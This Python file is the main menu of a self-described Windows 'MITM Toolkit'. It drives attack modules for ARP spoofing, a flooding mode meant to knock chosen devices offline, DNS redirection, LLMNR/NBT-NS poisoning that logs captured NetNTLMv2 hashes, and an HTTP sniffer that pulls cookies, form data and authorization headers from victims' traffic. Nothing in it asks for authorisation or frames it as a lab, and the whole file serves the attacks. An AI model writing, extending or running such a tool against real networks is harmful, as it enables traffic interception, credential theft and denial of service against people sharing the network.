#!/usr/bin/env python3
"""
MITM Toolkit - Windows Edition
================================
All-in-one CLI tool for network attacks using only a Windows laptop.
ARP Spoofing | DNS Spoofing | LLMNR/NBT-NS/mDNS Poisoning | Network Scanner

Usage: python mitm_app.py
"""
import os
import signal
import sys
import time

# Add parent directory to path for direct execution
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import utils
from core import scanner
from core import arp_spoof
from core import dns_spoof
from core import llmnr_spoof
from core import sniffer
from core import dashboard


# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════
_gateway_ip: str = ""
_gateway_mac: str = ""
_local_ip: str = ""
_local_mac: str = ""
_interface: str = ""
_network: str = ""
_targets: list[dict] = []
_active_attack: str = ""  # "arp", "dns", "llmnr", "combined"


# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════
def _init_network():
    """Initialize network information."""
    global _gateway_ip, _gateway_mac, _local_ip, _local_mac, _interface, _network

    _gateway_ip = utils.get_default_gateway()
    _local_ip = utils.get_local_ip(_gateway_ip)
    _local_mac = utils.get_local_mac(_local_ip)
    _interface = utils.get_interface_name()
    _network = scanner.get_local_network()

    # Resolve gateway MAC
    if _gateway_ip:
        try:
            from scapy.all import getmacbyip
            _gateway_mac = getmacbyip(_gateway_ip) or "??:??:??:??:??:??"
        except Exception:
            _gateway_mac = "??:??:??:??:??:??"


def _resolve_gateway_mac():
    """
    Lazily resolve gateway MAC if not already done.
    Tries: scapy ARP → OS arp cache (with ping to populate) → userspace.
    """
    global _gateway_mac
    if not _gateway_mac or _gateway_mac.startswith("??"):
        if _gateway_ip:
            # Method 2: Ping gateway to populate ARP cache, then read OS cache
            try:
                import subprocess
                # Ping once to force ARP resolution
                subprocess.run(
                    ["ping", "-n", "1", "-w", "1000", _gateway_ip],
                    capture_output=True, timeout=3
                )
                # Read Windows ARP cache
                result = subprocess.run(
                    ["arp", "-a", _gateway_ip],
                    capture_output=True, text=True, timeout=2
                )
                # Parse MAC from output like: "10.125.20.1    aa-bb-cc-dd-ee-ff    dynamic"
                for line in result.stdout.splitlines():
                    if _gateway_ip in line:
                        import re
                        m = re.search(r"(([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2})", line)
                        if m:
                            _gateway_mac = m.group(1).replace("-", ":").lower()
            except Exception:
                pass

    if not _gateway_mac or _gateway_mac.startswith("??"):
        if _gateway_ip:
            # Method 2: Scapy getmacbyip as last resort
            try:
                from scapy.all import getmacbyip
                _gateway_mac = getmacbyip(_gateway_ip) or "??:??:??:??:??:??"
            except Exception:
                _gateway_mac = "??:??:??:??:??:??"


def _cleanup():
    """Stop all running attacks and restore network state."""
    if arp_spoof.is_killswitch_active():
        arp_spoof.stop_killswitch()
    if arp_spoof.is_spoofing():
        arp_spoof.stop_spoof()
    if dns_spoof.is_spoofing():
        dns_spoof.stop_spoof()
    if llmnr_spoof.is_spoofing():
        llmnr_spoof.stop_spoof()
    if sniffer.is_running():
        sniffer.stop()
    utils.disable_ip_forwarding()


def _signal_handler(signum, frame):
    """Handle Ctrl+C gracefully."""
    print("\n")
    _cleanup()
    print("\n[!] Exiting MITM Toolkit. Goodbye!\n")
    sys.exit(0)


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# ══════════════════════════════════════════════════════════════
#  MENU SCREENS
# ══════════════════════════════════════════════════════════════
def _show_status():
    """Display current status bar."""
    print()
    print("─" * 60)
    print(f"  IFACE: {_interface:20s}  LOCAL:  {_local_ip} ({_local_mac})")
    print(f"  GW:    {_gateway_ip:20s}  GW MAC: {_gateway_mac}")
    print(f"  NET:   {_network}")
    if _active_attack:
        print(f"  ATTACK: {_active_attack.upper()} ACTIVE")
    if _targets:
        print(f"  TARGETS: {len(_targets)} host(s)")
    print("─" * 60)


def _menu_main():
    """Main menu."""
    while True:
        _show_status()

        print()
        print("  [1] Network Scanner       - Discover live hosts")
        print("  [2] ARP Spoofing (MITM)   - Man-in-the-Middle attack")
        print("  [3] WiFi poisoning      - Floods WiFi via ARP poisoning")
        print("  [4] DNS Spoofing           - Redirect DNS queries (requires MITM)")
        print("  [5] LLMNR/NBT-NS Poison   - Capture hashes / redirect traffic")
        print("  [6] Combined Attack        - ARP + DNS + LLMNR all at once")
        print("  [10] HTTP Traffic Sniffer   - Capture URLs, cookies, form data")
        print()
        print("  [7] Show Network Info")
        print("  [8] Check Prerequisites")
        print("  [9] Enable IP Forwarding (for MITM)")
        print()
        print("  [S] Stop All Attacks")
        print("  [Q] Quit")
        print()

        choice = input("  Select > ").strip().lower()

        if choice == "1":
            _menu_scan()
        elif choice == "2":
            _menu_arp_mitm()
        elif choice == "3":
            _menu_killswitch()
        elif choice == "4":
            _menu_dns_spoof()
        elif choice == "5":
            _menu_llmnr_spoof()
        elif choice == "6":
            _menu_combined()
        elif choice == "10":
            _menu_sniffer()
        elif choice == "7":
            _show_network_info()
        elif choice == "8":
            utils.run_prerequisite_checks()
            input("\n  Press Enter to continue...")
        elif choice == "9":
            _toggle_ip_forwarding()
        elif choice == "s":
            _cleanup()
            global _active_attack
            _active_attack = ""
            print("\n[✓] All attacks stopped.\n")
        elif choice == "q":
            _cleanup()
            print("\n[!] Goodbye!\n")
            sys.exit(0)
        else:
            print("\n  [!] Invalid choice.\n")


# ══════════════════════════════════════════════════════════════
#  SCANNER MENU
# ══════════════════════════════════════════════════════════════
def _menu_scan():
    """Network scanner submenu."""
    print("\n  ─── Network Scanner ───")
    print(f"  Scanning: {_network}")
    print()
    print("  [1] ARP Scan (fast, reliable)")
    print("  [2] ICMP Ping Sweep (slower, through firewalls)")
    print("  [3] Both")
    print("  [B] Back")

    choice = input("\n  Select > ").strip().lower()

    if choice == "1":
        scanner.arp_scan(_network)
        input("\n  Press Enter to continue...")
    elif choice == "2":
        scanner.ping_sweep(_network)
        input("\n  Press Enter to continue...")
    elif choice == "3":
        scanner.arp_scan(_network)
        scanner.ping_sweep(_network)
        input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  ARP SPOOFING (MITM)
# ══════════════════════════════════════════════════════════════
def _menu_arp_mitm():
    """ARP spoofing for Man-in-the-Middle."""
    global _targets, _active_attack, _gateway_mac

    if arp_spoof.is_spoofing():
        print("\n  [!] ARP spoofing is already active. Stop it first.")
        input("\n  Press Enter to continue...")
        return

    print("\n  ─── ARP Spoofing (MITM) ───")
    print("  This will poison both the target(s) AND the gateway,")
    print("  routing traffic through your machine for interception.")
    print()

    # Get targets
    hosts = scanner.get_targets(_network)
    if not hosts:
        return

    # Filter out us
    hosts = [h for h in hosts if h["ip"] != _local_ip]
    if not hosts:
        print("[!] No valid targets (excluding ourselves).")
        return

    _targets = hosts

    # Resolve gateway MAC
    _resolve_gateway_mac()
    if not _gateway_mac or _gateway_mac.startswith("??"):
        print(f"[!] Could not resolve gateway MAC for {_gateway_ip}")
        manual = input("  Enter gateway MAC manually (or press Enter to abort): ").strip()
        if manual:
            _gateway_mac = manual
        else:
            return

    print(f"\n  Gateway: {_gateway_ip} ({_gateway_mac})")
    print(f"  Targets: {', '.join(h['ip'] for h in _targets)}")
    print()

    # Enable IP forwarding warning
    print("  [*] For true MITM (not just DoS), IP forwarding must be enabled.")
    if not utils.check_ip_forwarding():
        enable = input("  Enable IP forwarding now? (y/n): ").strip().lower()
        if enable == "y":
            utils.enable_ip_forwarding()
    else:
        print("  [✓] IP forwarding appears to be enabled.")

    interval = input("\n  Packet interval in seconds [2.0]: ").strip()
    try:
        interval = float(interval) if interval else 2.0
    except ValueError:
        interval = 2.0

    print()
    if arp_spoof.start_spoof(_targets, _gateway_ip, _gateway_mac, interval, bidirectional=True):
        _active_attack = "arp-mitm"
        print("  [*] MITM active! Traffic is being routed through your machine.")
        print("  [*] Use Wireshark to inspect traffic. Press S to stop.")
        input("\n  Press Enter to return to menu (spoofing continues in background)...")
    else:
        input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  WiFi poisoning - flood wifi with packets
# ══════════════════════════════════════════════════════════════
def _menu_killswitch():
    """floods targets with ARP poison."""
    global _targets, _active_attack, _gateway_mac

    if arp_spoof.is_killswitch_active():
        print("\n  WiFi poisoning is currently ACTIVE.")
        print("  [D] Show live dashboard")
        print("  [S] Stop WiFi poisoning and restore network")
        print("  [Enter] Back to menu")
        sub = input("\n  Select > ").strip().lower()
        if sub == "d":
            dashboard.show_kill_dashboard()
        elif sub == "s":
            arp_spoof.stop_killswitch()
            if _active_attack == "killswitch":
                _active_attack = ""
            print("\n[✓] WiFi Poisoning disengaged.\n")
        return

    if arp_spoof.is_spoofing():
        print("\n  [!] ARP spoofing is already active. Stop it first.")
        input("\n  Press Enter to continue...")
        return

    print("\n  ═══ WiFi Poisoning ═══")
    print("  Instantly and reliably cuts target internet access.")
    print("  Floods ARP poison in BOTH directions with fake MACs.")
    print("  One click — targets go dark.")

    # Step 1: Pick targets (smart scan — ARP + ICMP)
    print("\n  --- Smart scanning network (ARP + ICMP ping) ---")
    print("  This finds devices even behind WiFi client isolation")
    hosts = scanner.smart_scan(_network, timeout=2.0, verbose=True)
    if not hosts:
        print("[!] No hosts found. Cannot proceed.")
        return

    hosts = [h for h in hosts if h["ip"] != _local_ip]
    if not hosts:
        print("[!] No valid targets (excluding this machine).")
        return

    # Mark gateway — we auto-exclude it from targets (no point poisoning itself)
    for h in hosts:
        h["is_gateway"] = (h["ip"] == _gateway_ip)

    print("\n  #   IP Address        MAC Address          Role")
    print("  --- ---------------- -------------------- --------")
    for i, h in enumerate(hosts):
        role = "GATEWAY" if h["is_gateway"] else ""
        print(f"  {i:2d}  {h['ip']:16s} {h['mac']:20s} {role}")

    print()
    print("  Enter 'all' to poison everyone, or target numbers (e.g. '0,2'):")
    choice = input("  > ").strip().lower()

    if choice == "all":
        # Exclude gateway automatically — poisoning it makes no sense
        picked = [h for h in hosts if not h.get("is_gateway")]
        if not picked:
            print("[!] No targets after excluding gateway.")
            return
        print(f"  [*] Auto-excluding gateway ({_gateway_ip}) — {len(picked)} target(s) selected.")
    else:
        try:
            indices = [int(x.strip()) for x in choice.split(",")]
            picked = [hosts[i] for i in indices if 0 <= i < len(hosts)]
        except (ValueError, IndexError):
            print("[!] Invalid selection.")
            return

    if not picked:
        print("[!] No targets selected.")
        return

    _targets = picked

    # Resolve gateway MAC (tries ping+cache then asks, but won't block)
    _resolve_gateway_mac()
    gw_mac_known = _gateway_mac and not _gateway_mac.startswith("??")

    if not gw_mac_known:
        print(f"\n  ⚠ Could not resolve gateway MAC for {_gateway_ip}")
        print("  The WiFi poisoning works via broadcast ARP — it WILL still work.")
        print("  On restore, ARP caches will self-heal after ~2 minutes.")
        manual = input("\n  Enter gateway MAC manually for clean restore (or press Enter to proceed): ").strip()
        if manual:
            _gateway_mac = manual
            gw_mac_known = True
        else:
            print("  [*] Proceeding in broadcast-only mode.")

    # Make sure IP forwarding is OFF (we DON'T want to route)
    if utils.check_ip_forwarding():
        print("\n  [!] IP forwarding is ON — disabling for WiFi poisoning...")
        utils.disable_ip_forwarding()

    print(f"\n  Targets to DISCONNECT: {', '.join(h['ip'] for h in _targets)}")
    print(f"  Gateway: {_gateway_ip}")
    print()

    confirm = input("  Start WiFi poisoning? (type 'go' to confirm): ").strip().lower()
    if confirm != "go":
        return

    if arp_spoof.start_killswitch(_targets, _gateway_ip, _gateway_mac,
                                  burst_interval=0.03, burst_size=5):
        _active_attack = "killswitch"
        print()
        # Calculate actual PPS for status box
        _n_threads = len(_targets) * 2  # 2 threads per target (target + gateway direction)
        _pps = _n_threads * 5 * (1.0 / (0.03 + 0.003 * 5))
        print("  ╔══════════════════════════════════════════════════════╗")
        print("  ║    WiFi poisoning ACTIVE                              ║")
        print(f"  ║  Flooding {len(_targets)} targets at ~{_pps:.0f} pkt/sec                     ║")
        print("  ║  Press S in main menu to STOP and restore network   ║")
        print("  ╚══════════════════════════════════════════════════════╝")

        # Offer live dashboard
        print()
        show_dash = input("   Show LIVE dashboard? (y/n): ").strip().lower()
        if show_dash == "y":
            dashboard.show_kill_dashboard()
        else:
            input("\n  Press Enter to return to menu (attack stays on)...")
    else:
        input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  DNS SPOOFING
# ══════════════════════════════════════════════════════════════
def _menu_dns_spoof():
    """DNS spoofing submenu."""
    global _active_attack

    if dns_spoof.is_spoofing():
        print("\n  [!] DNS spoofing is already active. Stop it first.")
        input("\n  Press Enter to continue...")
        return

    print("\n  ─── DNS Spoofing ───")
    print("  Redirects DNS queries for specified domains.")
    print("  NOTE: Requires ARP MITM to already be active!")
    print()

    if not arp_spoof.is_spoofing():
        print("  [!] ARP spoofing (MITM) is NOT active!")
        print("  [!] DNS spoofing needs MITM position to intercept traffic.")
        print()
        go = input("  Go to ARP MITM setup first? (y/n): ").strip().lower()
        if go == "y":
            _menu_arp_mitm()
        if not arp_spoof.is_spoofing():
            return

    # Configure rules
    dns_spoof.clear_rules()

    print("\n  Enter domains to redirect (one per line, empty to finish):")
    print("  Format: domain.com -> 1.2.3.4  (use * for wildcards)")
    print("  Example: *.google.com -> 192.168.1.50\n")

    while True:
        rule = input("  Rule > ").strip()
        if not rule:
            break
        try:
            parts = rule.split("->")
            if len(parts) == 2:
                domain = parts[0].strip()
                ip = parts[1].strip()
                dns_spoof.add_rule(domain, ip)
            else:
                print("  [!] Invalid format. Use: domain.com -> 1.2.3.4")
        except Exception as e:
            print(f"  [!] Error: {e}")

    if not dns_spoof.has_rules():
        print("  [!] No rules defined. Aborting.")
        return

    dns_spoof.show_rules()

    confirm = input("\n  Start DNS spoofing? (y/n): ").strip().lower()
    if confirm != "y":
        dns_spoof.clear_rules()
        return

    if dns_spoof.start_spoof(_interface):
        _active_attack = _active_attack + "+dns" if _active_attack else "dns"
        print("  [*] DNS spoofing active! Queries are being redirected.")
        print("  [*] Press S in main menu to stop.")
        input("\n  Press Enter to return to menu...")
    else:
        input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  LLMNR/NBT-NS POISONING
# ══════════════════════════════════════════════════════════════
def _menu_llmnr_spoof():
    """LLMNR/NBT-NS/mDNS poisoning submenu."""
    global _active_attack

    if llmnr_spoof.is_spoofing():
        print("\n  [!] LLMNR poisoner is already active. Stop it first.")
        input("\n  Press Enter to continue...")
        return

    print("\n  ─── LLMNR / NBT-NS / mDNS Poisoning ───")
    print("  Listens for broadcast name resolution queries and responds.")
    print()
    print("  This is highly effective on Windows networks:")
    print("  - When DNS fails, Windows broadcasts LLMNR/NBT-NS queries")
    print("  - We respond claiming to be the requested host")
    print("  - Victim connects to us -> we capture NetNTLMv2 hashes (SMB)")
    print("  - Also works for WPAD proxy detection poisoning\n")

    # Use local IP as responder
    responder_ip = _local_ip
    print(f"  Responder IP: {responder_ip}")

    custom_ip = input(f"  Use different IP? (or press Enter): ").strip()
    if custom_ip:
        responder_ip = custom_ip

    # Output file
    os.makedirs("captures", exist_ok=True)
    output = f"captures/hashes_{time.strftime('%Y%m%d_%H%M%S')}.txt"

    llmnr_spoof.configure(responder_ip, output)

    # Redirect rules
    print("\n  Add redirect rules? (domain -> IP for LLMNR/mDNS)")
    print("  Leave empty to just capture hashes (default).\n")

    while True:
        rule = input("  Redirect rule (or empty to skip): ").strip()
        if not rule:
            break
        try:
            parts = rule.split("->")
            if len(parts) == 2:
                domain = parts[0].strip()
                ip = parts[1].strip()
                llmnr_spoof.add_redirect(domain, ip)
            else:
                print("  [!] Invalid format. Use: domain.com -> 1.2.3.4")
        except Exception as e:
            print(f"  [!] Error: {e}")

    confirm = input("\n  Start LLMNR/NBT-NS/mDNS poisoning? (y/n): ").strip().lower()
    if confirm != "y":
        return

    if llmnr_spoof.start_spoof(_interface):
        _active_attack = _active_attack + "+llmnr" if _active_attack else "llmnr"
        print(f"  [*] Hashes will be logged to: {output}")
        print("  [*] Poisoning active! Waiting for broadcasts...")
        print("  [*] Press S in main menu to stop.")
        input("\n  Press Enter to return to menu...")
    else:
        input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  HTTP TRAFFIC SNIFFER
# ══════════════════════════════════════════════════════════════
def _menu_sniffer():
    """HTTP traffic sniffer submenu."""
    global _active_attack

    if sniffer.is_running():
        print("\n  [!] HTTP sniffer is already running. Stop it first.")
        input("\n  Press Enter to continue...")
        return

    print("\n  ─── HTTP Traffic Sniffer ───")
    print("  Captures HTTP requests/responses passing through your machine.")
    print()
    print("  Extracts and displays:")
    print("    • URLs (GET/POST paths, full URLs)")
    print("    • Cookies (request and Set-Cookie)")
    print("    • Form data (POST body, urlencoded fields)")
    print("    • Authorization headers (Basic, Bearer, etc.)")
    print("    • Response status codes")
    print()
    print("  TIP: Best used during ARP MITM to capture victim traffic!")
    print()

    # Verbosity
    print("  [1] Verbose mode  - Show ALL HTTP requests")
    print("  [2] Smart mode     - Only auth, cookies, logins, forms")
    print()
    mode = input("  Select mode [2]: ").strip()
    verbose = mode == "1"

    # Output file
    print()
    save = input("  Save captured traffic to file? (y/n): ").strip().lower()
    output_file = None
    if save == "y":
        os.makedirs("captures", exist_ok=True)
        output_file = f"captures/http_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        print(f"  Output: {output_file}")

    # Check if MITM is active (helpful context)
    if arp_spoof.is_spoofing():
        print("\n  [✓] ARP MITM is active - sniffing victim traffic!")
    else:
        print("\n  [!] No MITM active - will only see your own traffic.")
        print("  [!] Start ARP MITM first to capture other devices' traffic.")

    print()
    sniffer.configure(output_file, verbose)

    confirm = input("  Start HTTP sniffer? (y/n): ").strip().lower()
    if confirm != "y":
        return

    if sniffer.start(_interface):
        _active_attack = _active_attack + "+sniff" if _active_attack else "sniff"
        if output_file:
            print(f"  [*] Traffic being logged to: {output_file}")
        print("  [*] Sniffing active! Press S in main menu to stop.")
        input("\n  Press Enter to return to menu (sniffing continues)...")
    else:
        input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  COMBINED ATTACK
# ══════════════════════════════════════════════════════════════
def _menu_combined():
    """Launch all attacks together."""
    global _targets, _active_attack, _gateway_mac

    if arp_spoof.is_spoofing() or dns_spoof.is_spoofing() or llmnr_spoof.is_spoofing():
        print("\n  [!] Some attacks are already active. Stop all first (S).")
        input("\n  Press Enter to continue...")
        return

    print("\n  ─── Combined Attack ───")
    print("  Launches ARP MITM + DNS Spoofing + LLMNR Poisoning")
    print("  This is a full-spectrum local network attack.\n")

    # --- Step 1: Select targets ---
    print("  --- STEP 1: Target Selection ---")
    hosts = scanner.get_targets(_network)
    if not hosts:
        return
    hosts = [h for h in hosts if h["ip"] != _local_ip]
    if not hosts:
        print("[!] No valid targets.")
        return
    _targets = hosts

    _resolve_gateway_mac()
    if not _gateway_mac or _gateway_mac.startswith("??"):
        print(f"[!] Could not resolve gateway MAC.")
        return

    # --- Step 2: DNS Rules ---
    print("\n  --- STEP 2: DNS Spoofing Rules ---")
    dns_spoof.clear_rules()
    print("  Enter domains to redirect (empty line to finish):")
    while True:
        rule = input("  DNS rule > ").strip()
        if not rule:
            break
        try:
            parts = rule.split("->")
            if len(parts) == 2:
                dns_spoof.add_rule(parts[0].strip(), parts[1].strip())
        except Exception:
            print("  [!] Invalid format.")

    has_dns = dns_spoof.has_rules()
    if has_dns:
        dns_spoof.show_rules()
    else:
        print("  No DNS rules - DNS spoofing will be skipped.")

    # --- Step 3: LLMNR ---
    print("\n  --- STEP 3: LLMNR/NBT-NS Poisoning ---")
    do_llmnr = input("  Enable LLMNR/NBT-NS/mDNS poisoning? (y/n): ").strip().lower() == "y"
    if do_llmnr:
        os.makedirs("captures", exist_ok=True)
        output = f"captures/hashes_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        llmnr_spoof.configure(_local_ip, output)

        print("  Add redirect rules? (domain.com -> 1.2.3.4, empty to skip):")
        while True:
            rule = input("  LLMNR rule > ").strip()
            if not rule:
                break
            try:
                parts = rule.split("->")
                if len(parts) == 2:
                    llmnr_spoof.add_redirect(parts[0].strip(), parts[1].strip())
            except Exception:
                print("  [!] Invalid format.")

    # --- Step 4: HTTP Sniffer ---
    print("\n  --- STEP 4: HTTP Traffic Sniffer ---")
    do_sniff = input("  Enable HTTP traffic sniffer? (y/n): ").strip().lower() == "y"
    if do_sniff:
        print("  [✓] HTTP sniffer will start with combined attack")

    # --- Step 5: IP Forwarding ---
    print("\n  --- STEP 5: IP Forwarding ---")
    if not utils.check_ip_forwarding():
        enable = input("  Enable IP forwarding? (required for MITM) (y/n): ").strip().lower()
        if enable == "y":
            utils.enable_ip_forwarding()
    else:
        print("  [✓] IP forwarding appears enabled.")

    # --- Step 6: Launch ---
    print("\n  ═══ Summary ═══")
    print(f"  Gateway:  {_gateway_ip} ({_gateway_mac})")
    print(f"  Targets:  {', '.join(h['ip'] for h in _targets)}")
    print(f"  ARP MITM: ✓")
    print(f"  DNS Spoof: {'✓' if has_dns else '✗'}")
    print(f"  LLMNR/NBT-NS/mDNS: {'✓' if do_llmnr else '✗'}")
    print(f"  HTTP Sniffer: {'✓' if do_sniff else '✗'}")
    print()

    confirm = input("  LAUNCH ATTACK? (type 'yes' to confirm): ").strip().lower()
    if confirm != "yes":
        return

    # Launch ARP spoof first
    if not arp_spoof.start_spoof(_targets, _gateway_ip, _gateway_mac, interval=2.0, bidirectional=True):
        print("[!] ARP spoofing failed. Aborting.")
        return

    # Launch DNS
    if has_dns:
        dns_spoof.start_spoof(_interface)

    # Launch LLMNR
    if do_llmnr:
        llmnr_spoof.start_spoof(_interface)

    # Launch HTTP sniffer
    if do_sniff:
        sniffer.configure(output_file=None, verbose=True)
        sniffer.start(_interface)

    _active_attack = "combined"
    print("\n  ╔═════════════════════════════════════════════════════╗")
    print("  ║  COMBINED ATTACK ACTIVE!                           ║")
    print("  ║  ARP MITM + DNS + LLMNR + SNIFF all running.       ║")
    print("  ║  Press S in main menu to stop all attacks.         ║")
    print("  ╚═════════════════════════════════════════════════════╝")

    input("\n  Press Enter to return to menu (attacks continue)...\n")


# ══════════════════════════════════════════════════════════════
#  UTILITY SCREENS
# ══════════════════════════════════════════════════════════════
def _show_network_info():
    """Display detailed network information."""
    print("\n  ─── Network Information ───")
    print(f"  Local IP:        {_local_ip}")
    print(f"  Local MAC:       {_local_mac}")
    print(f"  Interface:       {_interface}")
    print(f"  Default Gateway: {_gateway_ip}")
    print(f"  Gateway MAC:     {_gateway_mac}")
    print(f"  Network:         {_network}")
    print(f"  Administrator:   {'Yes' if utils.is_admin() else 'No'}")
    print(f"  Npcap:           {'Yes' if utils.check_npcap() else 'No'}")
    print(f"  IP Forwarding:   {'Enabled' if utils.check_ip_forwarding() else 'Disabled/Unknown'}")
    print()

    input("  Press Enter to continue...")


def _toggle_ip_forwarding():
    """Toggle IP forwarding on/off."""
    if utils.check_ip_forwarding():
        print("\n  IP forwarding is currently ENABLED.")
        disable = input("  Disable it? (y/n): ").strip().lower()
        if disable == "y":
            utils.disable_ip_forwarding()
            print("  [✓] Disabled (reboot may be required).")
    else:
        print("\n  IP forwarding is currently DISABLED.")
        enable = input("  Enable it? (y/n): ").strip().lower()
        if enable == "y":
            utils.enable_ip_forwarding()
            print("  [✓] Enabled (reboot may be required).")
    input("\n  Press Enter to continue...")


# ══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════
def main():
    """Main entry point."""
    global _gateway_ip

    # Check admin
    if not utils.is_admin():
        print("\n" + "=" * 60)
        print("  MITM Toolkit requires ADMINISTRATOR privileges!")
        print("  Please re-run from an elevated terminal.")
        print("=" * 60 + "\n")
        sys.exit(1)

    # Run prereq checks
    if not utils.run_prerequisite_checks():
        print("\n[!] Some prerequisites are missing.")
        print("[!] Run setup.bat to install dependencies, or:")
        print("      pip install scapy")
        print("      Download Npcap from https://npcap.com/#download")
        print("      (Install with 'WinPcap API-compatible Mode' checked!)\n")
        cont = input("  Continue anyway? (y/n): ").strip().lower()
        if cont != "y":
            sys.exit(0)

    # Initialize network
    _init_network()

    if not _gateway_ip:
        print("\n[!] Could not detect default gateway.")
        manual = input("  Enter gateway IP manually: ").strip()
        if manual:
            _gateway_ip = manual  # type: ignore[assignment]
        else:
            print("Cannot continue without gateway.")
            sys.exit(1)

    utils.print_banner()
    print(f"\n[✓] Network initialized - Gateway: {_gateway_ip}, Local: {_local_ip}")

    # Launch main menu
    _menu_main()


if __name__ == "__main__":
    main()
